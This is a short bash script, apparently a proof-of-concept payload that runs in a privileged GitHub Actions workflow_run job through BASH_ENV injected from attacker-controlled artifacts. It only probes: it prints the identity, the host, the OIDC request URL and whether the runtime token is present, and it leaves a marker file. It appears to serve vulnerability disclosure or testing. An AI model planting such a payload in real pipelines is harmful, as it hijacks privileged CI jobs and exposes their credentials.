#!/bin/bash
# Executed automatically because the privileged workflow_run job writes
# BASH_ENV=<this file> into $GITHUB_ENV from attacker-controlled artifact data.
echo "== BASH_ENV EXECUTED uid=$(id -u) host=$(hostname) =="
echo "workspace=$(pwd)"
echo "OIDC_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-unset}"
echo "RUNTIME_TOKEN_SET=$([ -n "${ACTIONS_RUNTIME_TOKEN:-}" ] && echo yes || echo no)"
echo "PROBE_ENV_IN_SHELL=${PROBE_ENV:-unset}"
echo "BASH_ENV_RAN $(date -u +%FT%TZ)" >> /tmp/bashenv_marker
